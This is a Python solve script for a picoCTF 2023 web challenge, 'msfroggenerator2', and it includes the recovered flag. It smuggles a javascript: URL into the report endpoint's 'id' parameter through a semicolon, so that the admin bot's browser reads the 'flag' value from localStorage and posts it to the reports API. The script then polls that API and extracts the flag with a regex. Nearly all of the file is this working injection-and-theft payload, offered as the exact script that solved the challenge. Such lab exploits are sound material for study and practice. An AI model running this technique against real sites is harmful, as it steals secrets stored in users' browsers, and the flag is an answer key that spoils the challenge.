# 360 - msfroggenerator2  (Web Exploitation, picoCTF 2023)
# Flag: academy{th3_fsf_mak3s_th3_b3st_s0ftwar3_1dced559}
# Write-up: ../../../writeups/web-exploitation/360-msfroggenerator2.md
# Script exact utilise pour produire le flag.
#
import requests, re, sys, time, urllib.parse, json
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()

B = "http://xebec.cylabacademy.net:37497"
js = ("fetch('/api/reports/add',{method:'POST',headers:{'Content-Type':'application/json',"
      "'Authorization':'Bearer '+localStorage.getItem('flag')},"
      "body:JSON.stringify({screenshot:localStorage.getItem('flag')})})")
enc = urllib.parse.quote(js, safe="")
url = B + "/report?id=x;url=javascript:" + enc
print("URL len", len(url))
r = requests.get(url, timeout=30)
print("report:", r.status_code, r.text[:200])

for i in range(6):
    time.sleep(5)
    g = requests.get(B + "/api/reports/get", timeout=30)
    try:
        data = g.json()
    except Exception:
        print("get:", g.status_code, g.text[:200])
        continue
    print("reports:", len(data), flush=True)
    for rep in data:
        blob = json.dumps(rep)
        m = re.search(r"(academy|picoCTF)\{[^}]{1,120}\}", blob)
        if m:
            print("FLAG:", m.group(0))
            open(r"./_z_360_flag.txt", "w").write(m.group(0))
            sys.exit(0)
    print("   no flag yet", flush=True)
